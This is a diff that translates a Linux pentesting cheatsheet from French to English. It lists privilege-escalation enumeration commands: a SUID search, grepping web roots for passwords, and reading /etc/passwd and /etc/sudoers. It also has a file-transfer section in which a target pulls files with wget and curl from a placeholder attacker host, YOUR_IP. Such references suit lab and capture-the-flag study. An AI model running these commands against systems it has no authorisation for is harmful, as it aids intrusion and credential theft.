@@ -4,17 +4,17 @@ tags: [cheatsheet, linux]
 
 # 🐧 Linux Commands Cheatsheet
 
-## Navigation & fichiers
+## Navigation & Files
 
 ```bash
 pwd && ls -la
 find / -name "*.txt" 2>/dev/null
-find / -perm -4000 2>/dev/null          # Fichiers SUID
+find / -perm -4000 2>/dev/null          # SUID files
 grep -r "password" /var/www/ 2>/dev/null
 cat /etc/passwd | grep -v nologin
 ```
 
-## Réseau
+## Network
 
 ```bash
 ip a
@@ -24,7 +24,7 @@ ss -tulpn
 cat /etc/hosts
 ```
 
-## Processus
+## Processes
 
 ```bash
 ps aux
@@ -32,18 +32,18 @@ ps aux | grep root
 top
 ```
 
-## Transfert de fichiers
+## File Transfer
 
 ```bash
-# Depuis ta machine
+# From your machine
 python3 -m http.server 8080
 
-# Sur la cible
-wget http://TON_IP:8080/fichier
-curl http://TON_IP:8080/fichier -o fichier
+# On the target
+wget http://YOUR_IP:8080/file
+curl http://YOUR_IP:8080/file -o file
 ```
 
-## Sudo & permissions
+## Sudo & Permissions
 
 ```bash
 sudo -l
@@ -52,7 +52,7 @@ groups
 cat /etc/sudoers 2>/dev/null
 ```
 
-## Historique & config
+## History & Config
 
 ```bash
 history
